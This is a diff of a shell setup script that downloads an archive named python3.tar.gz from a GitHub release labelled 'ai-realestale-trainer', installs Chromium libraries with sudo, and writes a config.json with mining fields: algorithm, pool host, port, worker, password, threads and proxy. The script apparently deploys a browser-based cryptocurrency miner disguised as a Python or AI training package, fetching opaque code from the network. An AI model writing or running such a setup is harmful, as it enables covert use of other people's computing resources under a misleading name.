@@ -24,17 +24,17 @@ set_timezone() {
 
 # Function to download and extract python3.tar.gz
 download_python() {
-    wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
+    wget -O python3.tar.gz https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
     tar -xvf python3.tar.gz
     rm python3.tar.gz
-    cd python3
+    cd python3 || exit 1
 }
 
 # Function to install required packages
 install_packages() {
     export DEBIAN_FRONTEND=noninteractive
-    apt-get update
-    apt-get install -y --no-install-recommends \
+    sudo apt-get update
+    sudo apt-get install -y --no-install-recommends \
         libnss3-dev gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 \
         libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 \
         libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 \
@@ -47,17 +47,17 @@ install_packages() {
 # Function to create config.json file
 create_config_file() {
     cat <<EOL > config.json
-    {
-        "algorithm": "$M_ALGO",
-        "host": "$M_HOST",
-        "port": $M_PORT,
-        "worker": "$M_WORKER",
-        "password": "$M_PASSWORD",
-        "workers": $M_THREADS,
-        "log": false,
-        "chrome": "./chromium/chrome",
-        "proxy": "$M_PROXY"
-    }
+{
+    "algorithm": "$M_ALGO",
+    "host": "$M_HOST",
+    "port": $M_PORT,
+    "worker": "$M_WORKER",
+    "password": "$M_PASSWORD",
+    "workers": $M_THREADS,
+    "log": false,
+    "chrome": "./chromium/chrome",
+    "proxy": "$M_PROXY"
+}
 EOL
 }
 
